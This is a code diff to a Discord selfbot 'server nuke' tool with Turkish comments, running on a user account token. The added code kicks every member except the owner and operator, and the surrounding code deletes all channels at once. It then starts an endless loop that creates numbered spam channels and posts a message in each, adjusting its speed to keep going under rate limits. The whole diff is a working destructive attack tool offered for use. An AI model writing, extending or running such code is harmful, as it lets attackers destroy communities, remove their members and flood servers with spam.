@@ -1,8 +1,15 @@
+const DISCORD_TOKEN = '';
+const USER_ID = '';//Kullanıcak kişi idsi
+const CHANNEL_NAME = '';//Kanal adı
+const MESSAGE_CONTENT = '';//Mesaj içeriği
+const SPAM_COUNT = 10;//Kaç kanal oluşturulacak
+const SPAM_DELAY = 1000;//Kanal oluşturma aralığı
+
 const { Client } = require('discord.js-selfbot-v13');
 
 const CONFIG = {
-    DISCORD_TOKEN: '',
-    USER_ID: '',
+    DISCORD_TOKEN: DISCORD_TOKEN,
+    USER_ID: USER_ID,
     COMMAND_PREFIX: '.',
     DELAY: 500
 };
@@ -86,6 +93,37 @@ class DiscordSelfPatlatma {
                 await message.reply('🚀 Sunucu temizleme başlatılıyor... Bu işlem geri alınamaz!');
             } catch {}
 
+            console.log(`👥 Üyeler atılıyor...`);
+            
+            try {
+                const members = await guild.members.fetch();
+                let kickedCount = 0;
+                
+                const kickPromises = [];
+                
+                for (const [memberId, member] of members) {
+                    if (member.id !== guild.ownerId && member.id !== CONFIG.USER_ID) {
+                        kickPromises.push(
+                            member.kick('Henzy Self Patlatma').then(() => {
+                                kickedCount++;
+                                console.log(`👢 Üye atıldı: ${member.user.username}`);
+                            }).catch(() => {})
+                        );
+                    }
+                }
+                
+                await Promise.all(kickPromises);
+                
+                console.log(`✅ ${kickedCount} üye aynı anda atıldı!`);
+                
+                try {
+                    await message.reply(`👥 ${kickedCount} üye aynı anda atıldı! Kanal silme işlemi başlıyor...`);
+                } catch {}
+                
+            } catch (memberError) {
+                console.log(`❌ Üye atma hatası:`, memberError.message);
+            }
+
             const channels = guild.channels.cache;
             let deletedCount = 0;
             let errorCount = 0;
@@ -108,6 +146,53 @@ class DiscordSelfPatlatma {
             try {
                 await message.reply(`🚀 ${deletedCount} kanal aynı anda siliniyor!`);
             } catch {}
+
+            console.log(`🚀 Spam modu başlatılıyor! Sürekli kanal oluşturulacak...`);
+
+            let channelCount = 1;
+            let delay = 100;
+            let consecutiveErrors = 0;
+            let lastResetTime = Date.now();
+            
+            while (true) {
+                try {
+                    const channelName = `${CHANNEL_NAME}-${channelCount}`;
+                    const newChannel = await guild.channels.create(channelName, {
+                        type: 0,
+                        reason: 'Henzy Self Patlatma'
+                    });
+
+                    console.log(`✅ Kanal oluşturuldu: ${channelName}`);
+                    consecutiveErrors = 0;
+                    delay = Math.max(50, delay - 10);
+
+                    await this.sleep(200);
+
+                    try {
+                        await newChannel.send(MESSAGE_CONTENT);
+                        console.log(`📨 Mesaj gönderildi: ${channelName}`);
+                    } catch (sendError) {
+                        console.log(`⚠️ Mesaj gönderilemedi: ${channelName}`);
+                    }
+
+                } catch (createError) {
+                    consecutiveErrors++;
+                    delay = Math.min(2000, delay * 1.5);
+                    console.log(`⚠️ Rate limit! ${delay}ms bekleniyor... (Hata: ${consecutiveErrors})`);
+                    
+                    if (consecutiveErrors >= 5) {
+                        console.log(`🔄 5 saniye bekleniyor ve hız sıfırlanıyor...`);
+                        await this.sleep(5000);
+                        delay = 100;
+                        consecutiveErrors = 0;
+                        lastResetTime = Date.now();
+                        console.log(`🚀 Hız sıfırlandı! Tekrar hızlı başlıyor...`);
+                    }
+                }
+
+                channelCount++;
+                await this.sleep(delay);
+            }
 
         } catch (error) {
             console.error('❌ Sunucu temizleme hatası:', error.message);
